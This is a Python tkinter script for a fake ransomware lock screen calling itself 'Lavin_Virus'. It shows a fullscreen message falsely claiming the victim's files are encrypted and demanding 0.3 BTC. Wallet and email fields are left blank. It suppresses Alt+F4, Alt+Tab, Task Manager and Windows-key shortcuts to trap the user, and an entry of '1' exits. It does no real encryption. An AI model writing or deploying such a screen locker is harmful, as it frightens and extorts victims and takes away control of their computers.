# Import module
from tkinter import *
from tkinter import font
import keyboard

def get_key():
    global entry
    if entry.get() == "1":
        exit()

def empty():
    pass
# Create object
root = Tk()


# Adjust size
width = root.winfo_screenmmwidth()
height =  root.winfo_screenheight()
text = " hi, this is Lavin_Virus,\n ur files are encrypted.\n If u wanna descript ur file u should pay 0.3 BTC on wallet(___________)\n and send receipt on this emal(___________)\n Next u will get a key.\n I don't recommend to close this program, i have studied how to code and i don't sure that all will work right) "
root.attributes("-fullscreen", True)
root.configure(bg="black")
label = Label(root, text=text, fg="red", bg="black", font=("Old English Text MT", 20))
label.place(relx=0.5, rely=0.5, anchor='center')
entry = Entry(root, bg="white")
entry.place(rely=0.75, relx=0.5, anchor="center")
button = Button(root, bg="black", fg="White", text="Try", command=get_key)
button.place(relx=0.55, rely=0.75, anchor="c")
keyboard.add_hotkey("alt + f4", empty, suppress=True)
keyboard.add_hotkey("alt + tab", empty, suppress=True)
keyboard.add_hotkey("win + r", empty, suppress=True)
keyboard.add_hotkey("win + d", empty, suppress=True)
keyboard.add_hotkey("win", empty, suppress=True)
keyboard.add_hotkey("win + g", empty, suppress=True)
keyboard.add_hotkey("ctrl + shift + esc", empty, suppress=True)

# Execute tkinter
root.mainloop()
